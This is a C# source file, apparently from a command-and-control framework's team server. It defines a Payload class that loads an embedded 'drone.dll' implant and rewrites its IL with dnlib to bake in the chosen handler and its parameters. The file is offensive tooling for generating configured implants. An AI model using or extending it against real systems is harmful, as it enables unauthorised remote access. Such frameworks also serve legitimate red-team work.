using System;
using System.Linq;
using System.Threading.Tasks;

using dnlib.DotNet;
using dnlib.DotNet.Emit;

using TeamServer.Handlers;

namespace TeamServer.Models
{
    public abstract class Payload
    {
        public Handler Handler { get; set; }
        public byte[] Bytes { get; protected set; }

        public abstract Task Generate();

        protected async Task<ModuleDefMD> GetDroneModuleDef()
        {
            var drone = await Utilities.GetEmbeddedResource("drone.dll");
            
            var module = ModuleDefMD.Load(drone);
            module = EmbedHandler(module);

            return module;
        }

        private ModuleDefMD EmbedHandler(ModuleDefMD module)
        {
            // get handlers (not including the abstract)
            var handlers = module.Types
                .Where(t => t.FullName.Contains("Drone.Handlers", StringComparison.OrdinalIgnoreCase))
                .Where(t => !t.FullName.Equals("Drone.Handlers.Handler", StringComparison.OrdinalIgnoreCase));
            
            // match the one that matches the abstract name
            // it's actually set in the ctor of all places
            TypeDef targetHandler = null;
            
            foreach (var handler in handlers)
            {
                var ctor = handler.Methods.GetConstructor();
                if (ctor is null) continue;
                
                var instructions = ctor.Body.Instructions.Where(i => i.OpCode == OpCodes.Ldstr);
                
                foreach (var instruction in instructions)
                {
                    if (instruction.Operand is null) continue;
                    var operand = (string) instruction.Operand;
                    if (!operand.Equals(Handler.Name, StringComparison.OrdinalIgnoreCase)) continue;
                    
                    targetHandler = handler;
                    break;
                }
            }

            if (targetHandler is null) throw new Exception("Could not find matching Handler");

            if (Handler.Parameters is not null)
            {
                foreach (var handlerParameter in Handler.Parameters)
                {
                    // get matching method in handler
                    var method = targetHandler.Methods.GetMethod(handlerParameter.Name);
                    var instruction = method?.Body.Instructions.FirstOrDefault(i => i.OpCode == OpCodes.Ldstr);
                    if (instruction is null) continue;
                    instruction.Operand = handlerParameter.Value;
                }
            }

            // finally, ensure that the drone is creating an instance of the correct handler
            var droneType = module.Types.GetType("Drone");
            var getHandler = droneType.Methods.GetMethod("get_GetHandler");
            getHandler.Body.Instructions[0].Operand = targetHandler.Methods.GetConstructor();

            return module;
        }
    }
}